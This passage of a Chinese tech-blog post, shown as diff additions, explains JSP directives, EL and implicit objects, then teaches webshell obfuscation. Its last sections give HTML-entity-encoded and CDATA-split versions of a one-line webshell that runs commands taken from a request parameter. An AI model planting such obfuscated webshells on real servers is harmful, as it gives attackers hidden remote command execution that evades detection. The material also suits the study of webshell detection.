+&lt;jsp:directive.<span class="hljs-keyword">include</span> <span class="hljs-keyword">file</span>=<span class="hljs-string">&quot;文件相对 url 地址&quot;</span> /&gt;</code></pre></div>
+
+<h3 id="taglib指令"><a href="#taglib指令" class="headerlink" title="taglib指令"></a>taglib指令</h3><p>功能：</p>
+<div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">JSP </span>API允许用户自定义标签，一个自定义标签库就是自定义标签的集合。
+Taglib指令引入一个自定义标签集合的定义，包括库路径、自定义标签。</code></pre></div>
+
+<p>语法：</p>
+<div class="code-wrapper"><pre><code class="hljs routeros">&lt;%@ taglib <span class="hljs-attribute">prefix</span>=<span class="hljs-string">&quot;c&quot;</span> <span class="hljs-attribute">uri</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/jsp/jstl/core&gt;&quot;</span> %&gt;
+等价XML语法：
+&lt;jsp:directive.taglib <span class="hljs-attribute">prefix</span>=<span class="hljs-string">&quot;c&quot;</span> <span class="hljs-attribute">uri</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/jsp/jstl/core&gt;&quot;</span> /&gt;
+
+使用：
+&lt;c:out <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;test&quot;</span>/&gt;</code></pre></div>
+
+<h2 id="jsp语法"><a href="#jsp语法" class="headerlink" title="jsp语法"></a>jsp语法</h2><div class="code-wrapper"><pre><code class="hljs mel">&lt;% %&gt;：脚本片段，可在该片段定义java代码
+&lt;%! %&gt;：声明片段，可在该片段中定义变量供脚本片段中引用
+&lt;%= %&gt;：表达式，可引用脚本变量中的值</code></pre></div>
+
+<h2 id="jsp的EL表达式"><a href="#jsp的EL表达式" class="headerlink" title="jsp的EL表达式"></a>jsp的EL表达式</h2><p>通过EL表达式可以在jsp页面中获取来自4个作用域<code>application</code>、<code>session</code>、<code>request</code>和<code>pageContext</code>中的数据</p>
+<p>启用EL表达式</p>
+<div class="code-wrapper"><pre><code class="hljs mel">&lt;%@ page isELIgnored=<span class="hljs-string">&quot;false&quot;</span> %&gt;</code></pre></div>
+
+<h2 id="jsp隐式对象"><a href="#jsp隐式对象" class="headerlink" title="jsp隐式对象"></a>jsp隐式对象</h2><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p><code>javax.servlet.http.HttpServletRequest</code>类的实例，通过<code>setAttribute()</code>方法将对象存储在session作用域</p>
+<p><strong>常用方法：</strong></p>
+<div class="code-wrapper"><pre><code class="hljs dart">request.getRequestURL().toString()   <span class="hljs-comment">//获取请求的URL</span>
+
+<span class="hljs-comment">//获取项目的URL地址</span>
+&lt;%
+    <span class="hljs-built_in">String</span> contextPath = request.getContextPath();
+    <span class="hljs-built_in">StringBuffer</span> requestURL = request.getRequestURL();
+    <span class="hljs-built_in">String</span> projectUrl = requestURL.substring(<span class="hljs-number">0</span>, requestURL.indexOf(request.getRequestURI())) + contextPath;
+%&gt;</code></pre></div>
+
+<h3 id="response"><a href="#response" class="headerlink" title="response"></a>response</h3><p>javax.servlet.http.HttpServletResponse类的实例</p>
+<h3 id="out"><a href="#out" class="headerlink" title="out"></a>out</h3><p>java.io.PrintWriter类的实例</p>
+<p><strong>常用方法：</strong></p>
+<div class="code-wrapper"><pre><code class="hljs fortran"><span class="hljs-keyword">out</span>.<span class="hljs-built_in">print</span>(); 在页面中输出文本，不换行。
+<span class="hljs-keyword">out</span>.println(); 在页面中输出文本并换行。
+<span class="hljs-keyword">out</span>.<span class="hljs-keyword">flush</span>();  刷新输出流。</code></pre></div>
+
+<h3 id="jspContext"><a href="#jspContext" class="headerlink" title="jspContext"></a>jspContext</h3><p>对象 JspContext类的实例</p>
+<h3 id="application"><a href="#application" class="headerlink" title="application"></a>application</h3><p><code>javax.servlet.ServletContext</code> 类的实例</p>
+<p>可在servlet的doGet&#x2F;doPOST方法中通过<code>req.getServletContext()</code>获取，通过<code>setAttribute()</code>方法将对象存储在application作用域</p>
+<h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p><code>javax.servlet.ServletConfig</code> 类的实例</p>
+<h3 id="pageContext"><a href="#pageContext" class="headerlink" title="pageContext"></a>pageContext</h3><p><code>javax.servlet.jsp.PageContext</code> 类的实例</p>
+<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p><code>javax.servlet.http.HttpSession</code> 类的实例</p>
+<p>可在servlet的doGet&#x2F;doPOST方法中通过<code>req.getSession()</code>获取，通过<code>setAttribute()</code>方法将对象存储在session作用域</p>
+<h3 id="page"><a href="#page" class="headerlink" title="page"></a>page</h3><p>对象 Object类的实例</p>
+<h1 id="jsp-webshell的混淆"><a href="#jsp-webshell的混淆" class="headerlink" title="jsp webshell的混淆"></a><strong>jsp webshell的混淆</strong></h1><h2 id="使用Unicode编码代替字符"><a href="#使用Unicode编码代替字符" class="headerlink" title="使用Unicode编码代替字符"></a>使用Unicode编码代替字符</h2><p><strong>JSP可以识别Unicode编码后的代码</strong></p>
+<p>单个u</p>
+<div class="code-wrapper"><pre><code class="hljs golo">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;
+&lt;%
+    \\\\u006f\\\\u0075t.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;admin&quot;</span>);
+%&gt;</code></pre></div>
+
+<p>多个u</p>
+<div class="code-wrapper"><pre><code class="hljs golo">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;
+&lt;% o\\\\uuu0075\\\\uuu0074.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;caofalin&quot;</span>); %&gt;
+&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;
+&lt;% o\\\\uuuuuuu0075\\\\uuu0074.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;caofalin&quot;</span>); %&gt;</code></pre></div>
+
+<h2 id="使用-注释代替空格"><a href="#使用-注释代替空格" class="headerlink" title="使用&#x2F;**&#x2F;注释代替空格"></a>使用&#x2F;**&#x2F;注释代替空格</h2><div class="code-wrapper"><pre><code class="hljs processing">&lt;%@page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*, java.util.Base64&quot;</span> %&gt;
+&lt;%
+    <span class="hljs-built_in">String</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">str</span><span class="hljs-comment">/**/</span>=<span class="hljs-comment">/**/</span><span class="hljs-string">&quot;admin&quot;</span>;
+    <span class="hljs-type">byte</span>[]<span class="hljs-comment">/**/</span>strBytes<span class="hljs-comment">/**/</span>=<span class="hljs-comment">/**/</span><span class="hljs-built_in">str</span>.<span class="hljs-property">getBytes</span>();
+    <span class="hljs-built_in">String</span><span class="hljs-comment">/**/</span>toString<span class="hljs-comment">/**/</span>=<span class="hljs-comment">/**/</span>Base64.<span class="hljs-property">getEncoder</span>().<span class="hljs-property">encodeToString</span>(strBytes);
+    \\\\u006f\\\\u0075t.<span class="hljs-property">println</span>(toString);
+%&gt;</code></pre></div>
+
+<h2 id="使用拼接java代码语句"><a href="#使用拼接java代码语句" class="headerlink" title="使用&lt;% %&gt;拼接java代码语句"></a>使用&lt;% %&gt;拼接java代码语句</h2><div class="code-wrapper"><pre><code class="hljs mel">&lt;%@page import=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;&lt;%out.%&gt;&lt;%println%&gt;&lt;%(%&gt;&lt;%&quot;admin<span class="hljs-string">&quot;%&gt;&lt;%);%&gt;</span></code></pre></div>
+
+<h1 id="jspx-webshell混淆"><a href="#jspx-webshell混淆" class="headerlink" title="jspx webshell混淆"></a>jspx webshell混淆</h1><h2 id="使用html实体编码绕过"><a href="#使用html实体编码绕过" class="headerlink" title="使用html实体编码绕过"></a>使用html实体编码绕过</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">jsp:root</span> <span class="hljs-attr">xmlns:jsp</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/JSP/Page&gt;&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/1999/xhtml&gt;&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">jsp:directive.page</span> <span class="hljs-attr">contentType</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> <span class="hljs-attr">pageEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">jsp:scriptlet</span>&gt;</span>
+        //Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+        <span class="hljs-symbol">&amp;#x52;</span><span class="hljs-symbol">&amp;#x75;</span><span class="hljs-symbol">&amp;#x6e;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x6d;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x2e;</span><span class="hljs-symbol">&amp;#x67;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x52;</span><span class="hljs-symbol">&amp;#x75;</span><span class="hljs-symbol">&amp;#x6e;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x6d;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x2e;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x78;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x71;</span><span class="hljs-symbol">&amp;#x75;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x2e;</span><span class="hljs-symbol">&amp;#x67;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x50;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6d;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x22;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x6d;</span><span class="hljs-symbol">&amp;#x64;</span><span class="hljs-symbol">&amp;#x22;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x3b;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">jsp:scriptlet</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">jsp:root</span>&gt;</span></code></pre></div>
+
+<h2 id="利用CDATA拆分关键字"><a href="#利用CDATA拆分关键字" class="headerlink" title="利用CDATA拆分关键字"></a>利用CDATA拆分关键字</h2><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/CDATA.png" srcset="/img/loading.gif" lazyload></p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">jsp:root</span> <span class="hljs-attr">xmlns:jsp</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/JSP/Page&gt;&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/1999/xhtml&gt;&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">jsp:directive.page</span> <span class="hljs-attr">contentType</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> <span class="hljs-attr">pageEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">jsp:scriptlet</span>&gt;</span>
+        //Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+        Run&lt;![CDATA[time.get]]&gt;Run&lt;![CDATA[time]]&gt;().ex&lt;![CDATA[ec(request.get]]&gt;Parameter(&quot;cmd&quot;));
+    <span class="hljs-tag">&lt;/<span class="hljs-name">jsp:scriptlet</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">jsp:root</span>&gt;</span></code></pre></div>
+
+<h1 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/214483">https://www.anquanke.com/post/id/214483</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/" class="category-chain-item">编程技术</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/" class="category-chain-item">JavaWeb</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/JavaWeb%E7%90%86%E8%AE%BA/" title="JavaWeb理论">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JavaWeb理论</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Docker/docker/" title="docker">
+                        <span class="hidden-mobile">docker</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
